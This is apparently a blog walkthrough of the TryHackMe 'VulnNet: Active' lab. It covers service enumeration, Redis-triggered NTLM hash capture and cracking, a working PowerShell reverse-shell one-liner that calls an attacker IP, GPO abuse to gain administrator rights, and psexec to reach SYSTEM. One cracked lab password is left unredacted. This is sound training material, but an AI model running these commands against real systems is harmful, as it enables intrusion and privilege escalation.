---
layout: single
title: "TryHackMe - VulnNet: Active"
excerpt: VulnNet Entertainment has recently migrated their entire infrastructure to a new environment and, once again, they have brought you on board as a core penetration tester. Your mission is to thoroughly assess the security of their systems, identify weaknesses, and exploit them to gain initial access. This engagement will test your ability to perform reconnaissance, uncover hidden entry points, and chain vulnerabilities together to demonstrate the risks facing the organization.
date: 2025-11-08
classes: wide
header:
  teaser: /assets/images/thm-vulnnet-active/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Medium
  - Windows
tags:
  - smb-enum
  - kerberos-user-enum
  - hash-cracking
  - specific-binary-abuse
  - gpo-abuse
---

# Introduction
-------------
This writeup documents the penetration testing of the [**VulnNet: Active**](https://tryhackme.com/room/vulnnetactive) machine from the [**TryHackMe**](https://tryhackme.com/) platform.

In this ocasion, I'll abuse a vulnerable Redis DB service, use it to capture a NTLM hash to access the machine and finally perform a GPO Abuse to escalate privileges.

<br>
# Recon
------------------
## Enumeration of exposed services
----------------

Once we have discovered the IP of the machine we need to enumerate as much information as possible.

When we ping a machine that is in our local network, normally:
* TTL 64: Linux machine.
* TTL 128: Windows machine.
We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.

```java
❯ ping -c 1 10.10.234.191
PING 10.10.234.191 (10.10.234.191) 56(84) bytes of data.
64 bytes from 10.10.234.191: icmp_seq=1 ttl=127 time=56.2 ms

--- 10.10.234.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 56.229/56.229/56.229/0.000 ms
```

In this case, the target seems to be a Windows machine. Let's perform a port scan with nmap.

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.234.191 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 14:52 CET
Initiating SYN Stealth Scan at 14:52
Scanning 10.10.234.191 [65535 ports]
Discovered open port 445/tcp on 10.10.234.191
Discovered open port 53/tcp on 10.10.234.191
Discovered open port 139/tcp on 10.10.234.191
Discovered open port 135/tcp on 10.10.234.191
Discovered open port 49673/tcp on 10.10.234.191
Discovered open port 49795/tcp on 10.10.234.191
Discovered open port 6379/tcp on 10.10.234.191
Discovered open port 49677/tcp on 10.10.234.191
Discovered open port 49674/tcp on 10.10.234.191
Discovered open port 9389/tcp on 10.10.234.191
Discovered open port 49667/tcp on 10.10.234.191
Discovered open port 464/tcp on 10.10.234.191
Discovered open port 49701/tcp on 10.10.234.191
Discovered open port 49666/tcp on 10.10.234.191
Completed SYN Stealth Scan at 14:53, 40.17s elapsed (65535 total ports)
Nmap scan report for 10.10.234.191
Host is up, received user-set (0.17s latency).
Scanned at 2025-11-08 14:52:41 CET for 40s
Not shown: 65521 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
53/tcp    open  domain       syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
464/tcp   open  kpasswd5     syn-ack ttl 127
6379/tcp  open  redis        syn-ack ttl 127
9389/tcp  open  adws         syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49673/tcp open  unknown      syn-ack ttl 127
49674/tcp open  unknown      syn-ack ttl 127
49677/tcp open  unknown      syn-ack ttl 127
49701/tcp open  unknown      syn-ack ttl 127
49795/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.27 seconds
           Raw packets sent: 196605 (8.651MB) | Rcvd: 44 (1.936KB)
```

Let's perform a deeper scan with the parameter ``-sCV`` over those ports.

```java
❯ nmap -sCV -p53,135,139,445,464,6379,9389,49666,49667,49673,49674,49677,49701,49795 10.10.234.191 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 14:53 CET
Nmap scan report for VULNNET-BC3TCK1.VULNNET.LOCAL (10.10.234.191)
Host is up (0.055s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49795/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-08T13:54:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.41 seconds
```

Nmap found some open ports, but we can't determinate much more things from the output.

```java
❯ nxc smb 10.10.234.191 -u 'guest' -p '' --shares
SMB         10.10.234.191     445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         10.10.234.191     445    VULNNET-BC3TCK1  [-] vulnnet.local\guest: STATUS_ACCOUNT_DISABLED
```

I found the domain which is ``vulnnet.local`` and it seems that we are facing a Windows Server 2019 with the hostname ``VULNNET-BC3TCK1``. The account guest is disabled so le'ts try other enumeration vectors.

I'll add in my /etc/hosts file the following line:

```
10.10.234.191 VULNNET-BC3TCK1.VULNNET.LOCAL VULNNET.LOCAL
```


## Kerberos User enum
----------

```java
❯ ./kerbrute_linux_amd64 userenum --dc VULNNET-BC3TCK1.VULNNET.LOCAL -d VULNNET.LOCAL /home/kali/labs/thm/AttacktiveDirectory/scripts/userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/08/25 - Ronnie Flathers @ropnop

2025/11/08 14:21:41 >  Using KDC(s):
2025/11/08 14:21:41 >  	VULNNET-BC3TCK1.VULNNET.LOCAL:88

2025/11/08 14:21:53 >  [+] VALID USERNAME:	administrator@VULNNET.LOCAL
2025/11/08 14:23:20 >  [+] VALID USERNAME:	Administrator@VULNNET.LOCAL
```

We can't get so much information bruteforcing kerberos to enumerate users.

```java
❯ enum4linux -a 10.10.234.191
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Nov  8 14:33:45 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.234.191
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

...

=================================( Getting domain SID for 10.10.234.191 )=================================

Domain Name: VULNNET
Domain Sid: S-1-5-21-1405206085-1650434706-76331420

[+] Host is part of a domain (not a workgroup)
```

``enum4linux`` gives us the SID of the domain and some usernames but no much more interesting information about the DC.

<br>
# Exploitation
-------

At this point I was a bit stuck here. I reviewed nmap's output and saw this:

```java
6379/tcp  open  redis        syn-ack ttl 127
```

> **Redis** is an open-source, in-memory data structure store used as a database, cache, and message broker. It stores data in memory to achieve high performance and low latency, but it also has optional features to persist data to disk for durability. It is known for speed and is widely used in applications like real-time analytics, gaming leaderboards, and session stores

So, Redis is a kind of a DB service. Let's try to focus on this service, since we can't do much with the SMB service and Kerberos port is not even open...

## Redis Intrusion
-----------

```java
❯ redis-cli -h 10.10.234.191
10.10.234.191:6379> config get *
...
1) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
...
```

We found a user. Let's abuse redis to get the **NTLM hash** of this user.

- I'll start responder with ``responder -I tun0`` in other terminal session to capture the NTLM hash
- In the redis-cli session I have, I'll run the following command to force the user ``enterprise-security`` to access a file called *test* that doesn't exist.

```bash
eval "dofile('//10.8.78.182/test')" 0
```

Once we have captured the **NTLM hash** of the ``enterprise-secutiry`` user we need to **crack it**.

```java
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***REDACTED***  (enterprise-security)     
1g 0:00:00:01 DONE (2025-11-08 15:25) 0.5235g/s 2101Kp/s 2101Kc/s 2101KC/s sandrita107..sand36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Getting in the machine
-----

Now that we have valid credentials in the domain, we can try to list shared resources with ``smbclient.py``

```powershell
❯ smbclient -L //10.10.234.191 -U enterprise-security
Password for [WORKGROUP\enterprise-security]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Enterprise-Share Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.234.191 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

❯ smbclient //10.10.234.191/Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> pwd
Current directory is \\10.10.234.191\Enterprise-Share\
smb: \> cd C:\Users
cd \C:\Users\: NT_STATUS_OBJECT_NAME_INVALID
smb: \> ls
  .                                   D        0  Tue Feb 23 23:45:41 2021
  ..                                  D        0  Tue Feb 23 23:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 01:33:18 2021

		9558271 blocks of size 4096. 5116702 blocks available
```

Let's use `meterpeter` multi handler session to get an interactive session in the machine.

![](/assets/images/thm-vulnnet-active/multi_handler.png)

Now, I'll create a ``PurgeIrrelevantData_1826.ps1`` file to replace the actual one with the following content:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.8.78.182',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

After putting the new ``PurgeIrrelevantData_1826.ps1`` script in the shared resource and waiting, we get an interactive PowerShell session in the meterpreter session.

![](/assets/images/thm-vulnnet-active/whoami.png)

In the Desktop directory you'll find the user flag.

<br>
# Post-Exploitation
------
## GPO Abuse
-------

We can use SharpGPOAbuse.

> **SharpGPOAbuse** is a tool written in C# that allows an attacker to exploit edit permissions on a Group Policy Object (GPO) to execute tasks on machines that enforce that policy. If a user has permissions such as _GenericWrite_ on a GPO, they can modify it to execute arbitrary code on the affected machines.

I'll download [SharpexeGPOAbuse.exe](https://github.com/FSecureLABS/SharpGPOAbuse) and update the group policies on the target machine:

```powershell
PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
PS C:\Enterprise-Share> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

The enterprise-security user has GenericWrite over the GPO `SECURITY-POL-VN`, which allows him to modify it. Once we modify this GPO, we can execute commands in the hosts that are aplying that GPO. 

Now I'll cccess the machine with the new privileges and finally, you'll find the system flag in Administrator's desktop

```java
❯ psexec.py enterprise-security:sand_0873959498@10.10.234.191
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.234.191.....
[*] Found writable share ADMIN$
[*] Uploading file LLDejgtI.exe
[*] Opening SVCManager on 10.10.234.191.....
[*] Creating service ICNz on 10.10.234.191.....
[*] Starting service ICNz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\system.txt
***REDACTED***
```





